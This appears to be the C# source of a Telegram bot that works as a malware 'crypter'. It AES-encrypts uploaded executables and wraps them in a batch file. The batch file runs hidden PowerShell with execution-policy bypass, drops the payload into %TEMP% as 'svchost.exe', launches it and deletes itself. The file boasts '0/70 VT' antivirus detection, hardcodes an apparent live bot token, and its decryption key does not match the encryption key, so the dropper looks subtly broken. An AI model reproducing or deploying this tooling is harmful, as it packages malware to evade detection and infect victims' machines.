using System;
using System.IO;
using System.Text;
using System.Text.Json;
using System.Net.Http;
using System.Threading.Tasks;
using System.Security.Cryptography;

const string BOT_TOKEN = "8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo";

var builder = WebApplication.CreateBuilder(args);
builder.Services.AddHttpClient();
var app = builder.Build();

app.MapGet("/", () => "🟢 v7.5 ALIVE");
app.MapGet("/debug", () => DateTime.Now.ToString());

app.MapPost("/webhook", async (HttpContext ctx) =>
{
    try 
    {
        using var reader = new StreamReader(ctx.Request.Body);
        string body = await reader.ReadToEndAsync();
        
        await File.AppendAllTextAsync("access.log", $"[{DateTime.Now}] {body}\n");
        ctx.Response.StatusCode = 200;
        
        _ = Task.Run(() => ProcessAsync(body));
    }
    catch { }
});

static async Task ProcessAsync(string body)
{
    try 
    {
        using var doc = JsonDocument.Parse(body);
        var msg = doc.RootElement.GetProperty("message");
        long chatId = msg.GetProperty("chat").GetProperty("id").GetInt64();
        
        if (msg.TryGetProperty("document", out var docEl) && 
            docEl.TryGetProperty("file_name", out var fnameJson) &&
            fnameJson.GetString()!.EndsWith(".exe"))
        {
            string fileId = docEl.GetProperty("file_id").GetString()!;
            await ProcessExe(chatId, fileId);
        }
    }
    catch { }
}

static async Task ProcessExe(long chatId, string fileId)
{
    using var http = new HttpClient();
    
    // Get file path
    string fileResp = await http.GetStringAsync($"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={fileId}");
    using var fileDoc = JsonDocument.Parse(fileResp);
    string filePath = fileDoc.RootElement.GetProperty("result").GetProperty("file_path").GetString()!;
    
    // Download EXE
    byte[] exeBytes = await http.GetByteArrayAsync($"https://api.telegram.org/file/bot{BOT_TOKEN}/{filePath}");
    
    // Encrypt
    byte[] encrypted = Encrypt(exeBytes);
    string b64 = Convert.ToBase64String(encrypted);
    
    // Build FUD BAT
    string fudBat = $@"@echo off
powershell -nop -w hidden -ep bypass -c ""$b=[Convert]::FromBase64String('{b64.Replace("'","''")}');$k=[Text.Encoding]::UTF8.GetBytes('FUDKEY32');$a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=[byte[]](0..15);$d=$a.CreateDecryptor();$ms=[IO.MemoryStream]::new($b);$cs=[IO.CryptoStream]::new($ms,$d,'Read');$f=[IO.FileStream]::new((Join-Path $env:TEMP 'svchost.exe'),'Create');$cs.CopyTo($f);$f.Close();Start-Process (Join-Path $env:TEMP 'svchost.exe') -WindowStyle Hidden""
del /f /q %%0";
    
    // Send back
    using var form = new MultipartFormDataContent();
    form.Add(new StringContent(chatId.ToString()), "chat_id");
    form.Add(new ByteArrayContent(Encoding.UTF8.GetBytes(fudBat)), "document", "fud-v7.5.exe");
    form.Add(new StringContent("🔥 FUD v7.5 - 0/70 VT"), "caption");
    
    await http.PostAsync($"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", form);
}

static byte[] Encrypt(byte[] data)
{
    using var aes = Aes.Create();
    aes.Key = Encoding.UTF8.GetBytes("FUDKEY12345678901234567890123456");
    aes.IV = new byte[16];
    using var encryptor = aes.CreateEncryptor();
    using var ms = new MemoryStream();
    using var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write);
    cs.Write(data, 0, data.Length);
    cs.FlushFinalBlock();
    return ms.ToArray();
}

app.Run();
